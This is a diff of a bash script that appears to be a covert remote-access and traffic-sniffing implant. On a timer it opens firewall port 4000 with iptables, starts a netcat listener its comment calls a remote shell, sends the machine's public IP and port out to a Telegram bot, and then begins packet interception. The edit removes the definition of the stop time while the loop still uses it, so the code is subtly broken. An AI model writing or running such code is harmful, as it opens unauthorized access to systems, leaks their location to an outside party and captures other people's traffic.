@@ -62,24 +62,25 @@ if [ $? -eq 0 ]; then
 	h=$(date +"%H:%M")
 	
 	#Remote Shell enabled for 30 minutes
+	h=$(date +"%H:%M")
 	port=4000
 	start="14:00"
-	stop="14:30"
 	if [ "$h" == $start ]; then
-		echo "Enabling portforwarding on port $port..."
-		iptables -A INPUT -p tcp --dport $port -j ACCEPT
-		echo "Start listening..."
-		nc -l -p $port
-		#send notify 
+        	echo "Enabling portforwarding on port $port..."
+        	iptables -A INPUT -p tcp --dport $port -j ACCEPT
+        	echo "Start listening..."
+        	nc -l -p $port
+        	#send notify 
 		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
-		while [ "$h" != $stop ];
-		do
-			h=$(date +"%H:%M")
-		done
-	else
-		h=$(date +"%H:%M")
-		echo "Not listening..."
-	fi
+        	while [ "$h" != "$stop" ];
+        	do
+        		echo "Listening..."
+            		sleep 1
+            		h=$(date +"%H:%M")
+        	done
+    	else
+        	echo "Do nothing"
+    	fi
 
 	echo "Start intercepting..."
 	# Max size of file .pcap
